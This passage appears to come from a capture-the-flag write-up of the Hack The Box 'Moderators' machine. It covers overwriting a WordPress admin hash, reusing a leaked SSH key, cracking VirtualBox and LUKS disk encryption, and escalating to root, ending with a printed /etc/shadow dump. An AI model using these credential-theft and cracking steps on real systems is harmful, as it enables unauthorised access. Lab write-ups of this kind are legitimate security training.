+<div class="sourceCode" id="cb24"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="ex">MariaDB</span> <span class="pp">[</span><span class="ss">wordpress</span><span class="pp">]</span><span class="op">&gt;</span> UPDATE <span class="kw">`</span><span class="ex">wp_users</span><span class="kw">`</span> SET <span class="kw">`</span><span class="ex">user_pass</span><span class="kw">`</span> = <span class="st">'$P$Butw21NZp/bVFKSgE6gbBKtLjkl3tQ/'</span> WHERE user_login = <span class="st">'admin'</span><span class="kw">;</span></span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Query</span> OK, 1 row affected <span class="er">(</span><span class="ex">0.002</span> sec<span class="kw">)</span></span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Rows</span> matched: 1  Changed: 1  Warnings: 0</span>
+<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a><span class="ex">MariaDB</span> <span class="pp">[</span><span class="ss">wordpress</span><span class="pp">]</span><span class="op">&gt;</span> select <span class="pp">*</span> from wp_users<span class="kw">;</span></span>
+<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>  <span class="ex">1</span> <span class="kw">|</span> <span class="ex">admin</span>      <span class="kw">|</span> <span class="va">$P$Butw21NZp</span><span class="ex">/bVFKSgE6gbBKtLjkl3tQ/</span> </span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Set up a new SSH tunnel and login through <code>http://127.0.0.1:8080/wp-login.php</code>. Trying to login we’re forwarded to <code>http://moderators.htb:8080/xxx</code> and trying to edit <code>moderators.htb</code> to <code>127.0.0.1</code> invalidate the login. So edit <code>/etc/hosts</code> and add <code>moderators.htb</code> to <code>127.0.0.1</code>.</p>
+<p>Try to login again and everything works as intended: <img src="images/moderators11.png" class="img-fluid"></p>
+</section>
+<section id="step-2-1" class="level3">
+<h3 class="anchored" data-anchor-id="step-2-1">Step 2</h3>
+<p>At the bottom of the nav bar we find the second plugin <em>“PWDMS”</em>, check it out and we find the credentials <code>carl:Carl@thebest**</code> as well as <code>john</code>’s private SSH key..</p>
+<p><img src="images/moderators12.png" class="img-fluid"></p>
+<p>Copy the private key and re-format it, myself I use <a href="https://www.samltool.com/format_privatekey.php">samltool.com</a> for this purpose.</p>
+<div class="sourceCode" id="cb25"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators vim john-id_rsa </span>
+<span id="cb25-2"><a href="#cb25-2" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators chmod 400 john-id_rsa               </span>
+<span id="cb25-3"><a href="#cb25-3" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  moderators ssh john@10.10.11.173 <span class="at">-i</span> john-id_rsa</span>
+<span id="cb25-4"><a href="#cb25-4" aria-hidden="true" tabindex="-1"></a><span class="ex">john@moderators:~$</span> id</span>
+<span id="cb25-5"><a href="#cb25-5" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">john</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">john</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>1000<span class="kw">(</span><span class="ex">john</span><span class="kw">)</span><span class="ex">,1002</span><span class="er">(</span><span class="ex">moderators</span><span class="kw">)</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Doing some manual enumeration as <code>john</code> we find internal conversation logs talking about password policies and vbox etc:</p>
+<div class="sourceCode" id="cb26"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb26-1"><a href="#cb26-1" aria-hidden="true" tabindex="-1"></a><span class="ex">john@moderators:~/stuff/exp$</span> strings <span class="pp">*</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>We find the encrypted <em>.vdi</em> as well as the informational <em>.vbox</em> files:</p>
+<div class="sourceCode" id="cb27"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="ex">john@moderators:~/stuff/VBOX$</span> ls <span class="at">-al</span></span>
+<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a><span class="ex">total</span> 118800</span>
+<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 2 john john      4096 Jul 14 10:50 .</span>
+<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a><span class="ex">drwxr-xr-x</span> 4 john john      4096 Jul 14 10:50 ..</span>
+<span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a><span class="ex">-rwxr-xr-x</span> 1 john john      5705 Sep 18  2020 2019-08-01.vbox</span>
+<span id="cb27-6"><a href="#cb27-6" aria-hidden="true" tabindex="-1"></a><span class="ex">-rwxr-xr-x</span> 1 john john 121634816 Sep 18  2020 2019.vdi</span>
+<span id="cb27-7"><a href="#cb27-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb27-8"><a href="#cb27-8" aria-hidden="true" tabindex="-1"></a><span class="ex">john@moderators:~/stuff/VBOX$</span> cat 2019-08-01.vbox</span>
+<span id="cb27-9"><a href="#cb27-9" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb27-10"><a href="#cb27-10" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>VirtualBox <span class="va">xmlns</span><span class="op">=</span><span class="st">"http://www.virtualbox.org/"</span> <span class="va">version</span><span class="op">=</span><span class="st">"1.16-windows"</span><span class="op">&gt;</span></span>
+<span id="cb27-11"><a href="#cb27-11" aria-hidden="true" tabindex="-1"></a>  <span class="op">&lt;</span>Machine <span class="va">uuid</span><span class="op">=</span><span class="st">"{528b3540-b8be-4677-b43f-7f4969137747}"</span> <span class="va">name</span><span class="op">=</span><span class="st">"Moderator 1"</span> <span class="va">OSType</span><span class="op">=</span><span class="st">"Ubuntu_64"</span> <span class="va">snapshotFolder</span><span class="op">=</span><span class="st">"Snapshots"</span> <span class="va">lastStateChange</span><span class="op">=</span><span class="st">"2021-09-15T16:44:57Z"</span><span class="op">&gt;</span></span>
+<span id="cb27-12"><a href="#cb27-12" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>MediaRegistry<span class="op">&gt;</span></span>
+<span id="cb27-13"><a href="#cb27-13" aria-hidden="true" tabindex="-1"></a>      <span class="op">&lt;</span>HardDisks<span class="op">&gt;</span></span>
+<span id="cb27-14"><a href="#cb27-14" aria-hidden="true" tabindex="-1"></a>        <span class="op">&lt;</span>HardDisk <span class="va">uuid</span><span class="op">=</span><span class="st">"{12b147da-5b2d-471f-9e32-a32b1517ff4b}"</span> <span class="va">location</span><span class="op">=</span><span class="st">"F:/2019.vdi"</span> <span class="va">format</span><span class="op">=</span><span class="st">"VDI"</span> <span class="va">type</span><span class="op">=</span><span class="st">"Normal"</span><span class="op">&gt;</span></span>
+<span id="cb27-15"><a href="#cb27-15" aria-hidden="true" tabindex="-1"></a>          <span class="op">&lt;</span>Property <span class="va">name</span><span class="op">=</span><span class="st">"CRYPT/KeyId"</span> <span class="va">value</span><span class="op">=</span><span class="st">"Moderator 1"</span>/<span class="op">&gt;</span></span>
+<span id="cb27-16"><a href="#cb27-16" aria-hidden="true" tabindex="-1"></a>          <span class="op">&lt;</span>Property <span class="va">name</span><span class="op">=</span><span class="st">"CRYPT/KeyStore"</span> <span class="va">value</span><span class="op">=</span><span class="st">"U0NORQABQUVTLVhUUzI1Ni1QTEFJTjY0AAAAAAAAAAAAAAAAAABQQktERjItU0hB&amp;#13;&amp;#10;MjU2AAAAAAAAAAAAAAAAAAAAAAAAAEAAAABUQgV7yASjqRRgfezqVXSqcDjNzg1J&amp;#13;&amp;#10;jH/ENK/ozVskTyAAAADpYIvN2MBwhohZoxyfHl5d6YterYwh8lwMQ+5peBbjLCBO&amp;#13;&amp;#10;AABUYpGmB0lDsJbqgNsq451Bed5tHD8X6iXWLmJ6v6f7y2A9CABAAAAAo4alQy6T&amp;#13;&amp;#10;jyDI+8mvRgp4wXkMGavRxR6cC+ckk5yUgVhhgPxKNBNdhIHkNtjBMrj0uaVQ3ksk&amp;#13;&amp;#10;gwC6MrGLZFhl1g=="</span>/<span class="op">&gt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>The KeyStore seems interesting, and investigating we quickly find that we can crack it using <a href="https://github.com/axcheron/pyvboxdie-cracker">pyvboxdie-cracker</a>:</p>
+<div class="sourceCode" id="cb28"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a><span class="ex">➜</span>  pyvboxdie-cracker git:<span class="er">(</span><span class="ex">master</span><span class="kw">)</span> <span class="ex">✗</span> python3 pyvboxdie-cracker.py <span class="at">-v</span> /htb/moderators/2019-08-01.vbox <span class="at">-d</span> wordlist.txt                   </span>
+<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Starting</span> pyvboxdie-cracker...</span>
+<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Encrypted drive found :  F:/2019.vdi</span>
+<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> KeyStore information...</span>
+<span id="cb28-6"><a href="#cb28-6" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Algorithm</span> = AES-XTS256-PLAIN64</span>
+<span id="cb28-7"><a href="#cb28-7" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Hash</span> = PBKDF2-SHA256</span>
+<span id="cb28-8"><a href="#cb28-8" aria-hidden="true" tabindex="-1"></a>    <span class="ex">Final</span> Hash = 5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f</span>
+<span id="cb28-9"><a href="#cb28-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-10"><a href="#cb28-10" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Starting bruteforce...</span>
+<span id="cb28-11"><a href="#cb28-11" aria-hidden="true" tabindex="-1"></a>    <span class="ex">19</span> password tested...</span>
+<span id="cb28-12"><a href="#cb28-12" aria-hidden="true" tabindex="-1"></a>    <span class="ex">49</span> password tested...</span>
+<span id="cb28-13"><a href="#cb28-13" aria-hidden="true" tabindex="-1"></a>    <span class="ex">67</span> password tested...</span>
+<span id="cb28-14"><a href="#cb28-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-15"><a href="#cb28-15" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Password Found = computer</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+</section>
+<section id="step-3-1" class="level3">
+<h3 class="anchored" data-anchor-id="step-3-1">Step 3</h3>
+<p>Download the <em>.vdi</em> to your local machine and VirtualBox if you don’t already have it. I use my Windows box where I have VirtualBox already installed. Add the <em>.vbox</em> file to create the new machine <em>“Moderator 1”</em>. In the settings status we see that it’s missing <em>Ubuntu.vdi</em> and <em>2019.vdi</em>:</p>
+<p><img src="images/moderators13.png" class="img-fluid"></p>
+<p>Instead of removing and adding new drives, open remove the machine <code>Moderator 1</code> and edit <code>2019-08-01.vbox</code>, change the location of the disks to whatever suits you.</p>
+<div class="sourceCode" id="cb29"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a>      <span class="op">&lt;</span>HardDisks<span class="op">&gt;</span></span>
+<span id="cb29-2"><a href="#cb29-2" aria-hidden="true" tabindex="-1"></a>        <span class="op">&lt;</span>HardDisk <span class="va">uuid</span><span class="op">=</span><span class="st">"{12b147da-5b2d-471f-9e32-a32b1517ff4b}"</span> <span class="va">location</span><span class="op">=</span><span class="st">"D:\2019.vdi"</span> <span class="va">format</span><span class="op">=</span><span class="st">"VDI"</span> <span class="va">type</span><span class="op">=</span><span class="st">"Normal"</span><span class="op">&gt;</span></span>
+<span id="cb29-3"><a href="#cb29-3" aria-hidden="true" tabindex="-1"></a>        <span class="ex">[...</span> snip ...]</span>
+<span id="cb29-4"><a href="#cb29-4" aria-hidden="true" tabindex="-1"></a>        <span class="op">&lt;</span>HardDisk <span class="va">uuid</span><span class="op">=</span><span class="st">"{5999a8f0-e31d-4d4e-937d-173eb6ba8881}"</span> <span class="va">location</span><span class="op">=</span><span class="st">"Ubuntu.vdi"</span> <span class="va">format</span><span class="op">=</span><span class="st">"VDI"</span> <span class="va">type</span><span class="op">=</span><span class="st">"Normal"</span>/<span class="op">&gt;</span></span>
+<span id="cb29-5"><a href="#cb29-5" aria-hidden="true" tabindex="-1"></a>      <span class="op">&lt;</span>/HardDisks<span class="op">&gt;</span></span>
+<span id="cb29-6"><a href="#cb29-6" aria-hidden="true" tabindex="-1"></a>      <span class="op">&lt;</span>DVDImages<span class="op">&gt;</span></span>
+<span id="cb29-7"><a href="#cb29-7" aria-hidden="true" tabindex="-1"></a>        <span class="op">&lt;</span>Image <span class="va">uuid</span><span class="op">=</span><span class="st">"{7653d755-c513-4004-8891-be83fc130dba}"</span> <span class="va">location</span><span class="op">=</span><span class="st">"D:\ubuntu-22.04-desktop-amd64.iso"</span>/<span class="op">&gt;</span></span>
+<span id="cb29-8"><a href="#cb29-8" aria-hidden="true" tabindex="-1"></a>      <span class="op">&lt;</span>/DVDImages<span class="op">&gt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Add the machine again and it should now detect <em>2019.vdi</em>, if it doesn’t you may need to restart VirtualBox.</p>
+<p><img src="images/moderators14.png" class="img-fluid"></p>
+<p>We’re still not able to start the box, because of this <em>Ubuntu.vdi</em>, so lets just remove it from the <em>2019-08-01.vbox</em> file.. delete these line:</p>
+<div class="sourceCode" id="cb30"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb30-1"><a href="#cb30-1" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span>HardDisk <span class="va">uuid</span><span class="op">=</span><span class="st">"{5999a8f0-e31d-4d4e-937d-173eb6ba8881}"</span> <span class="va">location</span><span class="op">=</span><span class="st">"Ubuntu.vdi"</span> <span class="va">format</span><span class="op">=</span><span class="st">"VDI"</span> <span class="va">type</span><span class="op">=</span><span class="st">"Normal"</span>/<span class="op">&gt;</span></span>
+<span id="cb30-2"><a href="#cb30-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb30-3"><a href="#cb30-3" aria-hidden="true" tabindex="-1"></a>  <span class="op">&lt;</span>DVDImages<span class="op">&gt;</span></span>
+<span id="cb30-4"><a href="#cb30-4" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>Image <span class="va">uuid</span><span class="op">=</span><span class="st">"{7653d755-c513-4004-8891-be83fc130dba}"</span> <span class="va">location</span><span class="op">=</span><span class="st">"F:/ubuntu-22.04-desktop-amd64.iso"</span>/<span class="op">&gt;</span></span>
+<span id="cb30-5"><a href="#cb30-5" aria-hidden="true" tabindex="-1"></a>  <span class="op">&lt;</span>/DVDImages<span class="op">&gt;</span></span>
+<span id="cb30-6"><a href="#cb30-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb30-7"><a href="#cb30-7" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>AttachedDevice <span class="va">type</span><span class="op">=</span><span class="st">"HardDisk"</span> <span class="va">hotpluggable</span><span class="op">=</span><span class="st">"false"</span> <span class="va">port</span><span class="op">=</span><span class="st">"0"</span> <span class="va">device</span><span class="op">=</span><span class="st">"0"</span><span class="op">&gt;</span></span>
+<span id="cb30-8"><a href="#cb30-8" aria-hidden="true" tabindex="-1"></a>      <span class="op">&lt;</span>Image <span class="va">uuid</span><span class="op">=</span><span class="st">"{5999a8f0-e31d-4d4e-937d-173eb6ba8881}"</span>/<span class="op">&gt;</span></span>
+<span id="cb30-9"><a href="#cb30-9" aria-hidden="true" tabindex="-1"></a>    <span class="op">&lt;</span>/AttachedDevice<span class="op">&gt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>I was stuck here for a while, even when mounting a new ubuntu ISO and booting I got nowhere.. then I remembered the disk is crypted, but already we have the password - <code>computer</code> <br> Add it to the configurations and try again. Note that you need <a href="https://www.virtualbox.org/wiki/Downloads">VirtualBox Extension Pack</a> to be able to edit this..</p>
+<p><img src="images/moderators15.png" class="img-fluid"></p>
+<p>Now when booting we’re able to choose “Try or Install Ubuntu”: <img src="images/moderators16.png" class="img-fluid"></p>
+<p><img src="images/moderators17.png" class="img-fluid"></p>
+<p>Running <code>fdisk -l</code> and <code>df -h</code> we see that <code>/dev/sda</code> is not mounted, this is our disk <code>2019.vdi</code>. Mount it!</p>
+<div class="sourceCode" id="cb31"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="ex">ubuntu@ubuntu:~$</span> sudo fdisk <span class="at">-l</span></span>
+<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[...</span> snip ...]</span>
+<span id="cb31-3"><a href="#cb31-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Disk</span> model: VBOX HARDDISK</span>
+<span id="cb31-4"><a href="#cb31-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb31-5"><a href="#cb31-5" aria-hidden="true" tabindex="-1"></a><span class="ex">ubuntu@ubuntu:~$</span> df <span class="at">-h</span></span>
+<span id="cb31-6"><a href="#cb31-6" aria-hidden="true" tabindex="-1"></a><span class="ex">ubuntu@ubuntu:~$</span> sudo mount /dev/sda /tmp</span>
+<span id="cb31-7"><a href="#cb31-7" aria-hidden="true" tabindex="-1"></a><span class="ex">mount:</span> /tmp: unknown filesystem type <span class="st">'crypto_LUKS'</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p><img src="images/moderators18.png" class="img-fluid"></p>
+</section>
+<section id="step-4-1" class="level3">
+<h3 class="anchored" data-anchor-id="step-4-1">Step 4</h3>
+<p>Looking for ways to handle the LUKS encryption I find a few brute force tools, download and install <a href="https://github.com/glv2/bruteforce-luks">bruteforce-luks</a> on the Virtual Box VM and get at it. Very quickly we get the password - <code>abc123</code></p>
+<p><img src="images/moderators19.png" class="img-fluid"></p>
+<p>The disk only contains a directory named <code>scripts</code>, and within a set of subfolders. In the directory <code>all-in-one</code> there is one script with a timestamp that’s not like the others - <code>distro_update.sh</code><br> Look in the script and we find a password, probably for user <code>john</code> - <code>$_THE_best_Sysadmin_Ever_</code></p>
+<p><img src="images/moderators20.png" class="img-fluid"></p>
+<div class="sourceCode" id="cb32"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="ex">john@moderators:~/stuff/VBOX$</span> sudo su</span>
+<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a><span class="ex">[sudo]</span> password for john: <span class="va">$_THE_best_Sysadmin_Ever_</span></span>
+<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb32-4"><a href="#cb32-4" aria-hidden="true" tabindex="-1"></a><span class="ex">root@moderators:/home/john/stuff/VBOX#</span> id <span class="kw">&amp;&amp;</span> <span class="fu">cat</span> /root/root.txt <span class="kw">&amp;&amp;</span> <span class="fu">cat</span> /etc/shadow</span>
+<span id="cb32-5"><a href="#cb32-5" aria-hidden="true" tabindex="-1"></a><span class="va">uid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">gid</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span> <span class="va">groups</span><span class="op">=</span>0<span class="kw">(</span><span class="ex">root</span><span class="kw">)</span></span>
+<span id="cb32-6"><a href="#cb32-6" aria-hidden="true" tabindex="-1"></a><span class="ex">fa3a5c96cf4976a1d91f804c6372e3db</span></span>
+<span id="cb32-7"><a href="#cb32-7" aria-hidden="true" tabindex="-1"></a><span class="ex">root:</span><span class="va">$6$aqIOGu</span><span class="ex">.rJRXjVGgt</span><span class="va">$lN7qDpHZdrBxEcRi4VxcJt4dpNXwmxLsO7mTliULzPVcJyy5OPxLP3SmvgcprzkeZLbX</span><span class="ex">.lPrqEg3JYYyV3Ayo0:19021:0:99999:7:::</span></span>
+<span id="cb32-8"><a href="#cb32-8" aria-hidden="true" tabindex="-1"></a><span class="ex">john:</span><span class="va">$6$PK0A253j816qSMhV$4</span><span class="ex">Oy/1b8vR6K1XDcvBMzAVZn.MOVLiBWDHOugQorKdhVBnbi1o.fSKcSzrltl9z7hiGekw6bkt18XH14e0ALTC0:18890:0:99999:7:::</span></span>
+<span id="cb32-9"><a href="#cb32-9" aria-hidden="true" tabindex="-1"></a><span class="ex">lexi:</span><span class="va">$6$IXHONvrvfEmCO7dH$banmCiCTcf7rcYWQr7jn3GkYeRpfQYWxafrlhhpcpdOfqkMwBEpFXVinENnfhEa3EdiE92v30PBhp6GqF6w67</span><span class="ex">/:18890:0:99999:7:::</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+
+
+</section>
+</section>
+
+</main> <!-- /main -->
+<script id="quarto-html-after-body" type="application/javascript">
+window.document.addEventListener("DOMContentLoaded", function (event) {
+  const toggleBodyColorMode = (bsSheetEl) => {
+    const mode = bsSheetEl.getAttribute("data-mode");
+    const bodyEl = window.document.querySelector("body");
+    if (mode === "dark") {
+      bodyEl.classList.add("quarto-dark");
+      bodyEl.classList.remove("quarto-light");
+    } else {
+      bodyEl.classList.add("quarto-light");
+      bodyEl.classList.remove("quarto-dark");
+    }
+  }
+  const toggleBodyColorPrimary = () => {
+    const bsSheetEl = window.document.querySelector("link#quarto-bootstrap");
+    if (bsSheetEl) {
+      toggleBodyColorMode(bsSheetEl);
+    }
+  }
+  toggleBodyColorPrimary();  
+  const icon = "";
+  const anchorJS = new window.AnchorJS();
+  anchorJS.options = {
+    placement: 'right',
+    icon: icon
+  };
+  anchorJS.add('.anchored');
+  const isCodeAnnotation = (el) => {
+    for (const clz of el.classList) {
+      if (clz.startsWith('code-annotation-')) {                     
+        return true;
+      }
+    }
+    return false;
+  }
+  const onCopySuccess = function(e) {
+    // button target
+    const button = e.trigger;
+    // don't keep focus
+    button.blur();
+    // flash "checked"
+    button.classList.add('code-copy-button-checked');
+    var currentTitle = button.getAttribute("title");
+    button.setAttribute("title", "Copied!");
+    let tooltip;
+    if (window.bootstrap) {
+      button.setAttribute("data-bs-toggle", "tooltip");
+      button.setAttribute("data-bs-placement", "left");
+      button.setAttribute("data-bs-title", "Copied!");
+      tooltip = new bootstrap.Tooltip(button, 
+        { trigger: "manual", 
+          customClass: "code-copy-button-tooltip",
+          offset: [0, -8]});
+      tooltip.show();    
+    }
+    setTimeout(function() {
+      if (tooltip) {
+        tooltip.hide();
+        button.removeAttribute("data-bs-title");
+        button.removeAttribute("data-bs-toggle");
+        button.removeAttribute("data-bs-placement");
+      }
+      button.setAttribute("title", currentTitle);
+      button.classList.remove('code-copy-button-checked');
+    }, 1000);
+    // clear code selection
+    e.clearSelection();
+  }
+  const getTextToCopy = function(trigger) {
+      const codeEl = trigger.previousElementSibling.cloneNode(true);
+      for (const childEl of codeEl.children) {
+        if (isCodeAnnotation(childEl)) {
+          childEl.remove();
+        }
+      }
+      return codeEl.innerText;
+  }
+  const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
+    text: getTextToCopy
+  });
+  clipboard.on('success', onCopySuccess);
+  if (window.document.getElementById('quarto-embedded-source-code-modal')) {
+    // For code content inside modals, clipBoardJS needs to be initialized with a container option
+    // TODO: Check when it could be a function (https://github.com/zenorocha/clipboard.js/issues/860)
+    const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
+      text: getTextToCopy,
+      container: window.document.getElementById('quarto-embedded-source-code-modal')
+    });
+    clipboardModal.on('success', onCopySuccess);
+  }
+    var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
+    var mailtoRegex = new RegExp(/^mailto:/);
+      var filterRegex = new RegExp("https:\/\/exploit\.se");
+    var isInternal = (href) => {
+        return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
+    }
+    // Inspect non-navigation links and adorn them if external
+ 	var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
+    for (var i=0; i<links.length; i++) {
+      const link = links[i];
+      if (!isInternal(link.href)) {
+        // undo the damage that might have been done by quarto-nav.js in the case of
+        // links that we want to consider external
+        if (link.dataset.originalHref !== undefined) {
+          link.href = link.dataset.originalHref;
+        }
+      }
+    }
+  function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
+    const config = {
+      allowHTML: true,
+      maxWidth: 500,
+      delay: 100,
+      arrow: false,
+      appendTo: function(el) {
+          return el.parentElement;
+      },
+      interactive: true,
+      interactiveBorder: 10,
+      theme: 'quarto',
+      placement: 'bottom-start',
+    };
+    if (contentFn) {
+      config.content = contentFn;
+    }
+    if (onTriggerFn) {
+      config.onTrigger = onTriggerFn;
+    }
+    if (onUntriggerFn) {
+      config.onUntrigger = onUntriggerFn;
+    }
+    window.tippy(el, config); 
+  }
+  const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
+  for (var i=0; i<noterefs.length; i++) {
+    const ref = noterefs[i];
+    tippyHover(ref, function() {
+      // use id or data attribute instead here
+      let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
+      try { href = new URL(href).hash; } catch {}
+      const id = href.replace(/^#\/?/, "");
+      const note = window.document.getElementById(id);
+      if (note) {
+        return note.innerHTML;
+      } else {
+        return "";
+      }
+    });
+  }
+  const xrefs = window.document.querySelectorAll('a.quarto-xref');
+  const processXRef = (id, note) => {
+    // Strip column container classes
+    const stripColumnClz = (el) => {
+      el.classList.remove("page-full", "page-columns");
+      if (el.children) {
+        for (const child of el.children) {
+          stripColumnClz(child);
+        }
+      }
+    }
+    stripColumnClz(note)
+    if (id === null || id.startsWith('sec-')) {
+      // Special case sections, only their first couple elements
+      const container = document.createElement("div");
+      if (note.children && note.children.length > 2) {
+        container.appendChild(note.children[0].cloneNode(true));
+        for (let i = 1; i < note.children.length; i++) {
+          const child = note.children[i];
+          if (child.tagName === "P" && child.innerText === "") {
+            continue;
+          } else {
+            container.appendChild(child.cloneNode(true));
+            break;
+          }
+        }
+        if (window.Quarto?.typesetMath) {
+          window.Quarto.typesetMath(container);
+        }
+        return container.innerHTML
+      } else {
+        if (window.Quarto?.typesetMath) {
+          window.Quarto.typesetMath(note);
+        }
+        return note.innerHTML;
+      }
+    } else {
+      // Remove any anchor links if they are present
+      const anchorLink = note.querySelector('a.anchorjs-link');
+      if (anchorLink) {
+        anchorLink.remove();
+      }
+      if (window.Quarto?.typesetMath) {
+        window.Quarto.typesetMath(note);
+      }
+      // TODO in 1.5, we should make sure this works without a callout special case
+      if (note.classList.contains("callout")) {
+        return note.outerHTML;
+      } else {
+        return note.innerHTML;
+      }
+    }
+  }
+  for (var i=0; i<xrefs.length; i++) {
+    const xref = xrefs[i];
+    tippyHover(xref, undefined, function(instance) {
+      instance.disable();
+      let url = xref.getAttribute('href');
+      let hash = undefined; 
+      if (url.startsWith('#')) {
+        hash = url;
+      } else {
+        try { hash = new URL(url).hash; } catch {}
+      }
+      if (hash) {
+        const id = hash.replace(/^#\/?/, "");
+        const note = window.document.getElementById(id);
+        if (note !== null) {
+          try {
+            const html = processXRef(id, note.cloneNode(true));
+            instance.setContent(html);
+          } finally {
+            instance.enable();
+            instance.show();
+          }
+        } else {
+          // See if we can fetch this
+          fetch(url.split('#')[0])
+          .then(res => res.text())
+          .then(html => {
+            const parser = new DOMParser();
+            const htmlDoc = parser.parseFromString(html, "text/html");
+            const note = htmlDoc.getElementById(id);
+            if (note !== null) {
+              const html = processXRef(id, note);
+              instance.setContent(html);
+            } 
+          }).finally(() => {
+            instance.enable();
+            instance.show();
+          });
+        }
+      } else {
+        // See if we can fetch a full url (with no hash to target)
+        // This is a special case and we should probably do some content thinning / targeting
+        fetch(url)
+        .then(res => res.text())
+        .then(html => {
+          const parser = new DOMParser();
+          const htmlDoc = parser.parseFromString(html, "text/html");
+          const note = htmlDoc.querySelector('main.content');
+          if (note !== null) {
+            // This should only happen for chapter cross references
+            // (since there is no id in the URL)
+            // remove the first header
+            if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
+              note.children[0].remove();
+            }
